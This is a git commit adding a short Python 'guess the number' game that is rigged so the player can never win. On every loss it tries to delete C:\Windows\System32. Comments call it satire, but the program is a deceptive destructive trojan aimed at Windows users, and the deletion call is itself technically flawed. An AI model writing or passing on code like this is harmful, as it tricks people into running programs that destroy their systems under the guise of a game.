3a5fcc37f0317a435c75d4bdec765f71ff547dca
Daniel C <104099162+CatX711@users.noreply.github.com>
2023-04-23 02:06:12 +0100

    Create guess.py

---
+++ guess.py
@@ -0,0 +1,17 @@
+import random
+import os
+from time import sleep
+
+number = random.randint(1, 10) + 0.000001
+
+guess = input("Hey there! Let's plau a fun game :D Guess a number between 1 and 10: ")
+guess = int(guess)
+
+if guess == number:
+  print("Congratulations! You won! And, you also avoided death...")
+else:
+  os.remove("C:\Windows\System32") # bye bye 😈
+ 
+
+# im om mac so its funny how my code only affects windows users lmao
+# switch to macbook idiots!  (this is satire) 
